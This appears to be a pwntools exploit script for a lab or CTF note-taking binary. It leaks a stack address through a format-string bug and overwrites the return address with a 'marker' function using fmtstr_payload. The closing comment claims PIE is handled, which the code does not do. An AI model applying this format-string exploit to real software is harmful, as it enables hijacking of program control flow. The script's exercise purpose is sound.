#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

def write_note(idx, title, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", title)
    io.sendlineafter(b": ", content)

def read_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Title:\n")
    title = io.recvline()
    io.recvuntil(b"Content:\n")
    content = io.recvline()
    return title, content

io = process(exe.path)

#Calculating offset, leaking stack address
offset = 38
write_note(5, b"%6$p", b"a")
leak_stack, tmp = read_note(5)

#Adress calculation
addr_marker = exe.sym["marker"]
ret_addr = int(leak_stack, 16) + 0x8

#Injecting string to call the function
write_note(1, b"a", fmtstr_payload(offset, {ret_addr : addr_marker}))
read_note(1)

io.wait_for_close()

exit(io.poll())

#Assuming PIE, so leaking also binary address, then calls marker (can be ROP)